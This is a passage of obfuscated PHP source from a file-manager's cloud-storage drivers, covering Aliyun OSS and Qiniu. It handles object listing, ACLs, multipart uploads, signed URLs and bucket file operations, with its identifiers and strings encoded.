(empty($Ù¡‹õ¬)) { $ÆêŒÓ¨ƒ = $this->objectMeta($ú¸Û½Äù); if (!$ÆêŒÓ¨ƒ) { return $öşñ¼ĞÃ; } $Ù¡‹õ¬ = array($õİ‹§¶š[95] => strtotime($ÆêŒÓ¨ƒ[$õİ‹§¶š[1405]]), $õİ‹§¶š[86] => $ÆêŒÓ¨ƒ[$õİ‹§¶š[1404]] + 0); } if (isset($Ù¡‹õ¬[$õİ‹§¶š[86]])) { $öşñ¼ĞÃ[$õİ‹§¶š[86]] = $Ù¡‹õ¬[$õİ‹§¶š[86]]; } if (isset($Ù¡‹õ¬[$õİ‹§¶š[95]])) { $öşñ¼ĞÃ[$õİ‹§¶š[95]] = $Ù¡‹õ¬[$õİ‹§¶š[95]]; } if (isset($Ù¡‹õ¬[$õİ‹§¶š[213]]) && !trim($öşñ¼ĞÃ[$õİ‹§¶š[95]])) { $öşñ¼ĞÃ[$õİ‹§¶š[95]] = $Ù¡‹õ¬[$õİ‹§¶š[213]]; } return $öşñ¼ĞÃ; } private function folderInfo($ÕŒë³Ï˜, $¤Ú¥õÄí = false, $Œ£„äÕÍ = array()) { $ş¤Á“¦€ =& $_SERVER[ñ÷§¡å]; $¬Éõû’” = array($ş¤Á“¦€[32] => $this->pathThis($ÕŒë³Ï˜), $ş¤Á“¦€[94] => $this->getPathOuter($ş¤Á“¦€[8] . $ÕŒë³Ï˜), $ş¤Á“¦€[33] => $ş¤Á“¦€[85]); if ($¤Ú¥õÄí) { return $¬Éõû’”; } $¬Éõû’”[$ş¤Á“¦€[210]] = $¬Éõû’”[$ş¤Á“¦€[95]] = 0; $¬Éõû’”[$ş¤Á“¦€[211]] = $¬Éõû’”[$ş¤Á“¦€[212]] = !0; if (empty($Œ£„äÕÍ)) { $ÕŒë³Ï˜ = rtrim($ÕŒë³Ï˜, $ş¤Á“¦€[8]) . $ş¤Á“¦€[8]; $â³ˆ°õï = $this->objectMeta($ÕŒë³Ï˜); if (!$â³ˆ°õï) { return $¬Éõû’”; } $Œ£„äÕÍ = array($ş¤Á“¦€[210] => $â³ˆ°õï[$ş¤Á“¦€[520]][$ş¤Á“¦€[1412]], $ş¤Á“¦€[95] => strtotime($â³ˆ°õï[$ş¤Á“¦€[1405]])); } if (isset($Œ£„äÕÍ[$ş¤Á“¦€[95]])) { $¬Éõû’”[$ş¤Á“¦€[95]] = $Œ£„äÕÍ[$ş¤Á“¦€[95]]; } if (isset($Œ£„äÕÍ[$ş¤Á“¦€[210]])) { $¬Éõû’”[$ş¤Á“¦€[210]] = $Œ£„äÕÍ[$ş¤Á“¦€[210]]; } return $¬Éõû’”; } public function listPath($ğãà¢œ, $—•Œ•„ = false) { $ÚÔÕ¡—ì =& $_SERVER[ñ÷§¡å]; $ĞÏ¼üÈ  = $this->fileList($ğãà¢œ, $ÚÔÕ¡—ì[8], !0); foreach ($ĞÏ¼üÈ [$ÚÔÕ¡—ì[92]] as $‚¥Üçœ÷ => $Ù²çğïÑ) { $ĞÏ¼üÈ [$ÚÔÕ¡—ì[92]][$‚¥Üçœ÷] = $this->folderInfo($Ù²çğïÑ, $—•Œ•„, $Ù²çğïÑ); } foreach ($ĞÏ¼üÈ [$ÚÔÕ¡—ì[93]] as $‚¥Üçœ÷ => $Ù²çğïÑ) { $ĞÏ¼üÈ [$ÚÔÕ¡—ì[93]][$‚¥Üçœ÷] = $this->fileInfo($Ù²çğïÑ[$ÚÔÕ¡—ì[32]], $—•Œ•„, $Ù²çğïÑ); } return $ĞÏ¼üÈ ; } protected function infoChildren($¡¨úÑÙ”, &$ìç£¾âÇ) { $øÚü°æ† =& $_SERVER[ñ÷§¡å]; $»¾ âÆ = $this->fileList($¡¨úÑÙ”, $øÚü°æ†[12], !0); $ìç£¾âÇ[$øÚü°æ†[88]] += count($»¾ âÆ[$øÚü°æ†[92]]); $ìç£¾âÇ[$øÚü°æ†[87]] += count($»¾ âÆ[$øÚü°æ†[93]]); foreach ($»¾ âÆ[$øÚü°æ†[93]] as $Ë‹Šõò) { if (!$Ë‹Šõò || !$Ë‹Šõò[$øÚü°æ†[86]]) { continue; } $ìç£¾âÇ[$øÚü°æ†[86]] += $Ë‹Šõò[$øÚü°æ†[86]]; } } public function has($èÊº‡ßÅ, $ƒƒƒ´¯ = false, $×€¡Ïèè = true) { $šÎÓ¿¦€ =& $_SERVER[ñ÷§¡å]; $èÊº‡ßÅ = trim($èÊº‡ßÅ, $šÎÓ¿¦€[8]); $·ôñ­¾õ = empty($èÊº‡ßÅ) && $èÊº‡ßÅ !== $šÎÓ¿¦€[207] ? $šÎÓ¿¦€[12] : $èÊº‡ßÅ . $šÎÓ¿¦€[8]; $Ãù«ßå¯ = $šÎÓ¿¦€[12]; $Ô„‡äÑı = 500; $òãö¶Èö = $Ë½ÖØ¿æ = 0; while (!0) { check_abort(); $…Æõãµî = array($šÎÓ¿¦€[1400] => $šÎÓ¿¦€[8], $šÎÓ¿¦€[1401] => $·ôñ­¾õ, $šÎÓ¿¦€[1402] => $Ô„‡äÑı, $šÎÓ¿¦€[1403] => $Ãù«ßå¯); try { $‹Íóõ‹¹ = $this->client->listObjects($this->bucket, $…Æõãµî); } catch (OSS\Core\OssException $‡¢×øˆì) { break; } $Ãù«ßå¯ = $‹Íóõ‹¹->getNextMarker(); $ãÓóÄø™ = $‹Íóõ‹¹->getObjectList(); $´éİìÆ¢ = $‹Íóõ‹¹->getPrefixList(); if ($ƒƒƒ´¯) { if (count($ãÓóÄø™) > 1 || count($ãÓóÄø™) == 1 && $ãÓóÄø™[0]->getKey() != $·ôñ­¾õ) { $òãö¶Èö += count($ãÓóÄø™) - 1; } if (!empty($´éİìÆ¢)) { $Ë½ÖØ¿æ += count($´éİìÆ¢); } if ($Ãù«ßå¯ === $šÎÓ¿¦€[12]) { break; } continue; } if ($×€¡Ïèè) { if (!empty($ãÓóÄø™)) { if (count($ãÓóÄø™) > 1 || $ãÓóÄø™[0]->getKey() != $·ôñ­¾õ) { return !0; } } } else { if (!empty($´éİìÆ¢)) { return !0; } } if ($Ãù«ßå¯ === $šÎÓ¿¦€[12]) { break; } } if ($ƒƒƒ´¯) { return array($šÎÓ¿¦€[217] => $òãö¶Èö, $šÎÓ¿¦€[218] => $Ë½ÖØ¿æ); } return !1; } public function listAll($Î€â÷ö³) { $šÀĞ™¶¶ =& $_SERVER[ñ÷§¡å]; $‘€ØÖ–† = $this->fileList($Î€â÷ö³, $šÀĞ™¶¶[12], !0); $ÍîÎ©Ê = array(); foreach ($‘€ØÖ–†[$šÀĞ™¶¶[93]] as $µÆ×ƒ) { $ÍîÎ©Ê[$µÆ×ƒ[$šÀĞ™¶¶[32]]] = $µÆ×ƒ[$šÀĞ™¶¶[86]]; } foreach ($‘€ØÖ–†[$šÀĞ™¶¶[92]] as $µÆ×ƒ) { if (is_string($µÆ×ƒ)) { $ÍîÎ©Ê[$µÆ×ƒ] = 0; } } return $this->listAllFiles($Î€â÷ö³, array_keys($ÍîÎ©Ê), $ÍîÎ©Ê); } public function canRead($É–¾ùœ¾) { $Æèƒß î =& $_SERVER[ñ÷§¡å]; $ˆÅ´’„È = $this->pathAcl($É–¾ùœ¾); return $ˆÅ´’„È == $Æèƒß î[1413] || $ˆÅ´’„È == $Æèƒß î[565] ? !0 : !1; } public function canWrite($ÂıîÑ™ç) { $…˜£åüã = $this->pathAcl($ÂıîÑ™ç); return $…˜£åüã == $_SERVER[ñ÷§¡å][565] ? !0 : !1; } public function pathAcl($°òÊù¶ƒ) { $ÛÓ×Àº‘ =& $_SERVER[ñ÷§¡å]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $û¼‰Ÿ“„ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($°òÊù¶ƒ)); } catch (OSS\Core\OssException $€Ÿİ²İå) { return !1; } $Œå®Ú¥¡ = $û¼‰Ÿ“„ == $ÛÓ×Àº‘[37] ? $this->bucketAcl : $û¼‰Ÿ“„; if ($Œå®Ú¥¡ == $ÛÓ×Àº‘[1414]) { return $ÛÓ×Àº‘[1413]; } if ($Œå®Ú¥¡ == $ÛÓ×Àº‘[1415]) { return $ÛÓ×Àº‘[565]; } return $Œå®Ú¥¡; } private function chmodPath($×—á¡ª¿, $ÙÚåÏ÷í = '') { $„åäçš» =& $_SERVER[ñ÷§¡å]; $­¿ô³ = empty($ÙÚåÏ÷í) ? $„åäçš»[1415] : $ÙÚåÏ÷í; $ö’Ş¦Î = array($„åäçš»[37], $„åäçš»[208], $„åäçš»[1414], $„åäçš»[1415]); if (!in_array($­¿ô³, $ö’Ş¦Î)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($×—á¡ª¿), $­¿ô³); } catch (OSS\Core\OssException $Ã’ÌŒ–†) { return !1; } return !0; } public function getContent($êĞÕ”‚¾) { return $this->fileSubstr($êĞÕ”‚¾, -1); } public function setContent($İÃõ´õ©, $×ÊÕ÷Ò = '') { $½ßÚßñ™ =& $_SERVER[ñ÷§¡å]; try { $¯Ş‰Û‘® = $this->trafficLimit($½ßÚßñ™[1416]); $šÆéß = $this->client->putObject($this->bucket, $this->pathEncode($İÃõ´õ©), $×ÊÕ÷Ò, $¯Ş‰Û‘®); } catch (OSS\Core\OssException $ÃÖîØ•) { return !1; } $…‡å°Åñ = array($½ßÚßñ™[1406] => trim($šÆéß[$½ßÚßñ™[1417]], $½ßÚßñ™[128]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($İÃõ´õ©))); $this->updateObjMeta($İÃõ´õ©, $…‡å°Åñ); return isset($šÆéß[$½ßÚßñ™[1418]][$½ßÚßñ™[1365]]) ? !0 : !1; } private function updateObjMeta($ñÈˆÔÅ, $’öş…´) { $ñÈˆÔÅ = $this->pathEncode($ñÈˆÔÅ); try { $øš¤Äõë = array(OSS\OssClient::OSS_HEADERS => $’öş…´); $this->client->copyObject($this->bucket, $ñÈˆÔÅ, $this->bucket, $ñÈˆÔÅ, $øš¤Äõë); } catch (OSS\Core\OssException $é’–ÔÂó) { return !1; } return !0; } public function upload($ş±ñÈÜ, $ •€¹Ú‚, $˜šŒã–ª = false, $­­’×¼Ä = REPEAT_REPLACE) { $ âÒ¡Ç¯ =& $_SERVER[ñ÷§¡å]; $ıû³‚Ö = trim($ş±ñÈÜ, $ âÒ¡Ç¯[8]); $ÇÑé ûê = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($ âÒ¡Ç¯[1406] => @md5_file($ •€¹Ú‚)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($ş±ñÈÜ))); $ÇÑé ûê = $this->trafficLimit($ âÒ¡Ç¯[1416], $ÇÑé ûê); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($ıû³‚Ö), $ •€¹Ú‚, $ÇÑé ûê); } catch (OSS\Core\OssException $²¾ëÁøÂ) { return !1; } return $this->getPathOuter($ş±ñÈÜ); } public function getHost() { $«ú’•¦È =& $_SERVER[ñ÷§¡å]; $…“òÌâÈ = explode($«ú’•¦È[193], parent::getHost()); return $…“òÌâÈ[0] . $«ú’•¦È[193] . $this->bucket . $«ú’•¦È[10] . $…“òÌâÈ[1]; } public function uploadFormData($¬ÜÅ§ãè, $—Ÿ¬ûÄš = 3600) { $ï‘¸’Ö” =& $_SERVER[ñ÷§¡å]; if (!($üÎ„êÈû = $this->getHost())) { return !1; } $¸ÈÎ¦²¤ = $—Ÿ¬ûÄš; $ß¨ù¤ƒ = date($ï‘¸’Ö”[1419], time() + $¸ÈÎ¦²¤); $ šâ Èå = new DateTime($ß¨ù¤ƒ); $ğ…·ÇÒÄ = $ šâ Èå->format(DateTime::ISO8601); $ü•§•Ü² = strpos($ğ…·ÇÒÄ, $ï‘¸’Ö”[305]); $ğ…·ÇÒÄ = substr($ğ…·ÇÒÄ, 0, $ü•§•Ü²) . $ï‘¸’Ö”[1420]; $Çİô‰»¼ = 1048576000 * 5; $â‹¸Š¿£ = $this->pathFather($¬ÜÅ§ãè); $“ÈêŞÄİ = array($ï‘¸’Ö”[1319] => $ğ…·ÇÒÄ, $ï‘¸’Ö”[1320] => array(array($ï‘¸’Ö”[1421], 0, $Çİô‰»¼), array($ï‘¸’Ö”[1323], $ï‘¸’Ö”[1324], $â‹¸Š¿£))); $‰øƒ¸¸Ç = base64_encode(json_encode($“ÈêŞÄİ)); $ì÷ŒšĞ¹ = base64_encode(hash_hmac($ï‘¸’Ö”[241], $‰øƒ¸¸Ç, $this->secret, !0)); $Œµİƒä­ = array($ï‘¸’Ö”[1329] => $‰øƒ¸¸Ç, $ï‘¸’Ö”[1422] => $this->accessKey, $ï‘¸’Ö”[1325] => $ï‘¸’Ö”[1317], $ï‘¸’Ö”[1423] => $ì÷ŒšĞ¹, $ï‘¸’Ö”[191] => $üÎ„êÈû); $Œµİƒä­ = $this->trafficLimit($ï‘¸’Ö”[1416], $Œµİƒä­); return $Œµİƒä­; } public function multiUploadFormData($¬€ùß¼», $Š·îßÂÃ = 3600) { $‘Œ„ïåÃ =& $_SERVER[ñ÷§¡å]; if (!($´ÅáşÑÑ = $this->getHost())) { return !1; } $‘´Š¥˜µ = $this->trafficLimit($‘Œ„ïåÃ[1416]); $Ìê¯•ÖĞ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($¬€ùß¼»), $‘´Š¥˜µ); return array($‘Œ„ïåÃ[233] => $Ìê¯•ÖĞ, $‘Œ„ïåÃ[191] => $´ÅáşÑÑ . $‘Œ„ïåÃ[8] . $this->pathEncode($¬€ùß¼»), $‘Œ„ïåÃ[234] => gmdate($‘Œ„ïåÃ[1424]), $‘Œ„ïåÃ[104] => $¬€ùß¼»); } public function multiUploadAuthData($åÇë·ïÃ, $ĞààØœ§ = array()) { $–œûÍÉÍ =& $_SERVER[ñ÷§¡å]; $òÒ¡Ìšè = isset($ĞààØœ§[$–œûÍÉÍ[234]]) ? $ĞààØœ§[$–œûÍÉÍ[234]] : gmdate($–œûÍÉÍ[1424]); $Ã¾¤âÔ¼ = isset($ĞààØœ§[$–œûÍÉÍ[184]]) ? $ĞààØœ§[$–œûÍÉÍ[184]] : $–œûÍÉÍ[12]; $éÒˆË‹Æ = $åÇë·ïÃ; if (isset($ĞààØœ§[$–œûÍÉÍ[104]])) { $éÒˆË‹Æ = $ĞààØœ§[$–œûÍÉÍ[104]]; unset($ĞààØœ§[$–œûÍÉÍ[104]]); } if (isset($ĞààØœ§[$–œûÍÉÍ[235]])) { $ĞààØœ§[$–œûÍÉÍ[234]] = $òÒ¡Ìšè; return $this->listUploadParts($éÒˆË‹Æ, $ĞààØœ§); } $–†Ş™Œ° = array($–œûÍÉÍ[236], $–œûÍÉÍ[12], $–œûÍÉÍ[130], $òÒ¡Ìšè, "\x78\x2d\x6f\163\x73\55\144\141\164\x65\72{$òÒ¡Ìšè}", $–œûÍÉÍ[8] . $this->bucket . $–œûÍÉÍ[8] . $éÒˆË‹Æ . $Ã¾¤âÔ¼); if (strpos($Ã¾¤âÔ¼, $–œûÍÉÍ[237]) === 0) { $–†Ş™Œ°[0] = $–œûÍÉÍ[238]; if ($Ø…Á×ç‡ = $this->trafficLimit($–œûÍÉÍ[1416])) { $éÒˆË‹Æ = $–œûÍÉÍ[1425]; array_splice($–†Ş™Œ°, 5, 0, $éÒˆË‹Æ . $–œûÍÉÍ[4] . $Ø…Á×ç‡[$éÒˆË‹Æ]); } } if (isset($ĞààØœ§[$–œûÍÉÍ[239]]) && $ĞààØœ§[$–œûÍÉÍ[239]] == $–œûÍÉÍ[240]) { $–†Ş™Œ°[0] = $–œûÍÉÍ[240]; } if (!empty($ĞààØœ§[$–œûÍÉÍ[1426]])) { $¹áÒùÎ± = array_merge(array($–†Ş™Œ°[4]), $ĞààØœ§[$–œûÍÉÍ[1426]]); sort($¹áÒùÎ±); $–†Ş™Œ°[4] = implode($–œûÍÉÍ[65], $¹áÒùÎ±); } $ş”ë«¦Ÿ = implode($–œûÍÉÍ[65], $–†Ş™Œ°); $Î‹Õ±Ÿè = base64_encode(hash_hmac($–œûÍÉÍ[241], $ş”ë«¦Ÿ, $this->secret, !0)); $Ù‘©Ë½ = $–œûÍÉÍ[1390] . $this->accessKey . $–œûÍÉÍ[4] . $Î‹Õ±Ÿè; if (strpos($Ã¾¤âÔ¼, $–œûÍÉÍ[237]) === 0) { $Ù‘©Ë½ = array($–œûÍÉÍ[243] => $Ù‘©Ë½, $–œûÍÉÍ[234] => $òÒ¡Ìšè); if ($Ø…Á×ç‡) { $Ù‘©Ë½ = array_merge($Ù‘©Ë½, $Ø…Á×ç‡); } } return $Ù‘©Ë½; } public function listUploadParts($ÊëÇÉğ¤, $ê¶Äàù) { $ºù®Â…ğ =& $_SERVER[ñ÷§¡å]; $¨ËïØó® = parse_url_query($ê¶Äàù[$ºù®Â…ğ[184]]); $çß•ÔÖ» = $this->client->listParts($this->bucket, $this->pathEncode($ÊëÇÉğ¤), $¨ËïØó®[$ºù®Â…ğ[233]]); $–øõÌ  = $çß•ÔÖ»->getListPart(); $²ß«™Çø = array(); foreach ($–øõÌ  as $Å’éÛ‹¬) { $²ß«™Çø[] = array($ºù®Â…ğ[1410] => $Å’éÛ‹¬->getPartNumber(), $ºù®Â…ğ[1411] => trim($Å’éÛ‹¬->getETag(), $ºù®Â…ğ[128])); } unset($ê¶Äàù[$ºù®Â…ğ[235]], $ê¶Äàù[$ºù®Â…ğ[239]]); $ÊÀª¿ÉŸ = $this->multiUploadAuthData($ÊëÇÉğ¤, $ê¶Äàù); if (empty($ÊÀª¿ÉŸ)) { return !1; } return array($ºù®Â…ğ[243] => $ÊÀª¿ÉŸ, $ºù®Â…ğ[234] => $ê¶Äàù[$ºù®Â…ğ[234]], $ºù®Â…ğ[245] => $²ß«™Çø); } public function download($Õ·¶µ†¿, $æóîÁò) { if ($this->isFolder($Õ·¶µ†¿)) { return !1; } try { $ßò‚‚æä = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $æóîÁò); $ßò‚‚æä = $this->trafficLimit($_SERVER[ñ÷§¡å][119], $ßò‚‚æä); $this->client->getObject($this->bucket, $this->pathEncode($Õ·¶µ†¿), $ßò‚‚æä); } catch (OSS\Core\OssException $£——Á«Î) { return !1; } return $æóîÁò; } public function fileSubstr($¹İÔ°¥Š, $ı¼îÅ•ß = 0, $óò±™î£ = false) { if ($ı¼îÅ•ß === -1) { $Ü£ë‰§¬ = array(); } else { if ($óò±™î£ === !1) { $—ÆıèÒ› = $this->size($¹İÔ°¥Š); } else { $—ÆıèÒ› = $ı¼îÅ•ß + $óò±™î£ - 1; } $Ü£ë‰§¬ = array(OSS\OssClient::OSS_RANGE => "{$ı¼îÅ•ß}\x2d{$—ÆıèÒ›}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($¹İÔ°¥Š), $Ü£ë‰§¬); } catch (OSS\Core\OssException $³î©şÓË) { think_exception($³î©şÓË->getMessage()); return !1; } } private function trafficLimit($È¸ùéÑÀ, $Ã”™¨Ü¥ = array()) { $ËäÕÕ =& $_SERVER[ñ÷§¡å]; if ($È¸ùéÑÀ == $ËäÕÕ[1416] && $this->isUploadServer() || $È¸ùéÑÀ == $ËäÕÕ[119] && $this->isFileOutServer()) { return $Ã”™¨Ü¥; } $¹ÁöıÒæ = floatval($GLOBALS[$ËäÕÕ[6]][$ËäÕÕ[99]][$ËäÕÕ[117]][$È¸ùéÑÀ]) * 1024 * 1024 * 8; if (!$¹ÁöıÒæ) { return $Ã”™¨Ü¥; } $¹ÁöıÒæ = $¹ÁöıÒæ < 819200 ? 819200 : ($¹ÁöıÒæ > 838860800 ? 838860800 : $¹ÁöıÒæ); $Ã”™¨Ü¥[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($¹ÁöıÒæ); return $Ã”™¨Ü¥; } public function link($£¡Ş£Â, $½É˜Şòá = array()) { $àØÈ·„ =& $_SERVER[ñ÷§¡å]; if (!$this->exist($£¡Ş£Â) || $this->isFolder($£¡Ş£Â)) { return !1; } try { $½É˜Şòá = $this->trafficLimit($àØÈ·„[119], $½É˜Şòá); $Øé¥È­ = $this->client->signUrl($this->bucket, $this->pathEncode($£¡Ş£Â), 3600 * 12, $àØÈ·„[240], $½É˜Şòá); return $this->getCdnLink($Øé¥È­); } catch (OSS\Core\OssException $Ú„ÁİÖ³) { return !1; } } public function fileOut($˜ı©ğá, $í÷Şø¶ª = false, $‘äŸ£Ş‚ = false, $®™Î«íœ = '') { $í¢ä½Ö =& $_SERVER[ñ÷§¡å]; if ($this->isFileOutServer()) { return $this->fileOutServer($˜ı©ğá, $í÷Şø¶ª, $‘äŸ£Ş‚, $®™Î«íœ); } if (!$‘äŸ£Ş‚) { $‘äŸ£Ş‚ = $this->pathThis($˜ı©ğá); } $‘äŸ£Ş‚ = rawurlencode($‘äŸ£Ş‚); $¶Á”²°· = get_file_mime(get_path_ext($‘äŸ£Ş‚)); if ($¶Á”²°· == $í¢ä½Ö[227]) { return parent::fileOut($˜ı©ğá, $í÷Şø¶ª, $‘äŸ£Ş‚, $®™Î«íœ); } $í÷Şø¶ª = $í÷Şø¶ª ? $í¢ä½Ö[1427] : $í¢ä½Ö[1428]; $½ë´èöœ = array(OSS\OssClient::OSS_SUB_RESOURCE => $í¢ä½Ö[1429] . rawurlencode("{$í÷Şø¶ª}\x3b\x66\x69\154\145\156\x61\155\x65\x3d{$‘äŸ£Ş‚}")); $½ë´èöœ[OSS\OssClient::OSS_SUB_RESOURCE] .= $í¢ä½Ö[1430] . rawurlencode($¶Á”²°·); $ÄèÔÏ¹’ = $this->link($˜ı©ğá, $½ë´èöœ); $this->fileOutLink($ÄèÔÏ¹’); } public function fileOutServer($„Í¯ğ¶š, $‚¬Éœ‘ = false, $÷õ‘ = false, $Ö©½¯Ñ— = '') { parent::fileOut($„Í¯ğ¶š, $‚¬Éœ‘, $÷õ‘, $Ö©½¯Ñ—); } public function fileOutImage($€íĞåÖí, $ÑçÙ¦´ê = 250) { $®¦×şÒà = array(OSS\OssClient::OSS_PROCESS => $_SERVER[ñ÷§¡å][1431] . $ÑçÙ¦´ê); $â²Êôó = $this->link($€íĞåÖí, $®¦×şÒà); $this->fileOutLink($â²Êôó); } public function fileOutImageServer($²ĞÔô‰, $±õàÛ­¤ = 250) { parent::fileOutImage($²ĞÔô‰, $±õàÛ­¤); } public function fileOutLink($„Ä¡ÒÉ¹) { $èº¢‚áÙ =& $_SERVER[ñ÷§¡å]; if (!$this->isCdnHost() && substr($„Ä¡ÒÉ¹, 0, 7) == $èº¢‚áÙ[1332]) { $„Ä¡ÒÉ¹ = $èº¢‚áÙ[1333] . substr($„Ä¡ÒÉ¹, 7); } header($èº¢‚áÙ[171] . $„Ä¡ÒÉ¹); die; } public function hashMd5($ò­Ö†¶Ù, $“¤³¦—² = '') { $†œæÓ” =& $_SERVER[ñ÷§¡å]; $ò–ü¡ŒÈ = $this->_objectMeta($ò­Ö†¶Ù); if (!$ò–ü¡ŒÈ) { return $†œæÓ”[12]; } if (!isset($ò–ü¡ŒÈ[$†œæÓ”[1406]]) && !empty($“¤³¦—²)) { $ğÀ¹óÎÅ = $this->updateObjMeta($ò­Ö†¶Ù, array($†œæÓ”[1406] => $“¤³¦—²)); $ò–ü¡ŒÈ[$†œæÓ”[1406]] = $ğÀ¹óÎÅ ? $“¤³¦—² : $†œæÓ”[12]; } return isset($ò–ü¡ŒÈ[$†œæÓ”[1406]]) ? strtolower($ò–ü¡ŒÈ[$†œæÓ”[1406]]) : $†œæÓ”[12]; } public function size($ºû£îõ) { $ş¦Êé¾ä = $this->objectMeta($ºû£îõ); return $ş¦Êé¾ä ? $ş¦Êé¾ä[$_SERVER[ñ÷§¡å][86]] : 0; } public function info($¿ºÑ¡ÀÁ) { if ($this->isFolder($¿ºÑ¡ÀÁ)) { return $this->folderInfo($¿ºÑ¡ÀÁ); } else { if ($this->isFile($¿ºÑ¡ÀÁ)) { return $this->fileInfo($¿ºÑ¡ÀÁ); } } return !1; } public function exist($¡äÜ®ç) { return $this->isFile($¡äÜ®ç) || $this->isFolder($¡äÜ®ç); } public function isFile($Å”ÁéÛ) { return !$this->isFolder($Å”ÁéÛ) && $this->objectMeta($Å”ÁéÛ); } public function isFolder($±áĞò©) { return $this->cacheMethod($_SERVER[ñ÷§¡å][175], $±áĞò©); } protected function objectMeta($²Ï±ˆ†) { return $this->cacheMethod($_SERVER[ñ÷§¡å][177], $²Ï±ˆ†); } protected function _objectMeta($Çû˜»ûé) { $§¾È—©ğ =& $_SERVER[ñ÷§¡å]; try { $í—›Úõö = $this->client->getObjectMeta($this->bucket, $this->pathEncode($Çû˜»ûé)); } catch (OSS\Core\OssException $¨øˆ„) { $í—›Úõö = !1; } if ($í—›Úõö) { $í—›Úõö[$§¾È—©ğ[86]] = intval($í—›Úõö[$§¾È—©ğ[1404]]); } return $í—›Úõö; } protected function _isFolder($ÒÀÎ‰ßÒ) { $ùŸ½à¿â =& $_SERVER[ñ÷§¡å]; if ($ÒÀÎ‰ßÒ == $ùŸ½à¿â[12] || $ÒÀÎ‰ßÒ == $ùŸ½à¿â[8]) { return !0; } $Î¤ì‡º½ = array($ùŸ½à¿â[1400] => $ùŸ½à¿â[8], $ùŸ½à¿â[1401] => rtrim($ÒÀÎ‰ßÒ, $ùŸ½à¿â[8]) . $ùŸ½à¿â[8], $ùŸ½à¿â[1402] => 1, $ùŸ½à¿â[1403] => $ùŸ½à¿â[12]); $–Ø´ƒù = $this->client->listObjects($this->bucket, $Î¤ì‡º½); if ($–Ø´ƒù->getObjectList() || $–Ø´ƒù->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public function __construct($‘„·‡³) { parent::__construct(); require_once SDK_DIR . $_SERVER[ñ÷§¡å][1432]; $this->_init($‘„·‡³); } public function _init($ŒÎ³¤Ô) { $Úšˆæ÷ˆ =& $_SERVER[ñ÷§¡å]; foreach ($ŒÎ³¤Ô as $øãÎŸ‘Œ => $ùÏ¼ÀßÕ) { if (isset($this->{$øãÎŸ‘Œ})) { $this->{$øãÎŸ‘Œ} = $ùÏ¼ÀßÕ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($Úšˆæ÷ˆ[1433] . LNG($Úšˆæ÷ˆ[1391])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($ÊÀÏƒ¸, $½æúá—Ç = '', $¦®ˆäÖ = REPEAT_RENAME) { if ($this->setContent($ÊÀÏƒ¸, $½æúá—Ç)) { return $this->getPathOuter($ÊÀÏƒ¸); } return !1; } public function mkdir($ö”¦€ã•, $î­¿í½ù = REPEAT_SKIP) { $‹Ô¿÷¨ğ =& $_SERVER[ñ÷§¡å]; $óŒ‡˜ç¤ = trim($ö”¦€ã•, $‹Ô¿÷¨ğ[8]); if ($this->_isFolder($óŒ‡˜ç¤)) { return $this->getPathOuter($óŒ‡˜ç¤); } $ö”¦€ã• = $óŒ‡˜ç¤ . $‹Ô¿÷¨ğ[8]; $‘¦å£ˆö = get_path_this($óŒ‡˜ç¤); $±ÈêËûÅ = $ö”¦€ã• . $‘¦å£ˆö; if (!$this->mkfile($±ÈêËûÅ)) { return !1; } if (!$this->moveFile($±ÈêËûÅ, $ö”¦€ã•)) { $this->delFile($±ÈêËûÅ); return !1; } return $this->getPathOuter($óŒ‡˜ç¤); } public function copyFile($ÀË—Ãô³, $ü©¿ÛÉÍ) { $®¯Æ«ü¤ = $this->bucketManager->copy($this->bucket, $ÀË—Ãô³, $this->bucket, $ü©¿ÛÉÍ, !0); return $®¯Æ«ü¤ ? !1 : $this->getPathOuter($ü©¿ÛÉÍ); } public function moveFile($ß¥ò³‚, $ÖâÉ¸Ñü) { $¾İ ‰ç = $this->bucketManager->move($this->bucket, $ß¥ò³‚, $this->bucket, $ÖâÉ¸Ñü, !0); return $¾İ ‰ç ? !1 : $this->getPathOuter($ÖâÉ¸Ñü); } public function delFile($ŠÍªØÖõ) { if (!$this->exist($ŠÍªØÖõ)) { return !0; } $Í›òóÊÃ = $this->bucketManager->delete($this->bucket, $ŠÍªØÖõ); return $Í›òóÊÃ ? !1 : !0; } public function delFolder($™Ô‹›Ğ) { $ôäûñÈù =& $_SERVER[ñ÷§¡å]; if (!$this->exist($™Ô‹›Ğ)) { return !0; } $this->listItemCache = !1; $øÕÕ”„ = $this->fileList($™Ô‹›Ğ); $this->listItemCache = !0; $©Ô„ÀÂ’ = trim($™Ô‹›Ğ, $ôäûñÈù[8]) . $ôäûñÈù[8]; if (!empty($™Ô‹›Ğ) && $™Ô‹›Ğ !== $ôäûñÈù[207] && !in_array($©Ô„ÀÂ’, $øÕÕ”„[$ôäûñÈù[92]])) { $øÕÕ”„[$ôäûñÈù[92]][] = $©Ô„ÀÂ’; } $ƒ Ø­°µ = $this->delByBatch($øÕÕ”„[$ôäûñÈù[93]]); if (!$ƒ Ø­°µ) { return !1; } $ƒ Ø­°µ = $this->delByBatch($øÕÕ”„[$ôäûñÈù[92]]); if (!$ƒ Ø­°µ) { return !1; } return $this->delFile($©Ô„ÀÂ’); } private function 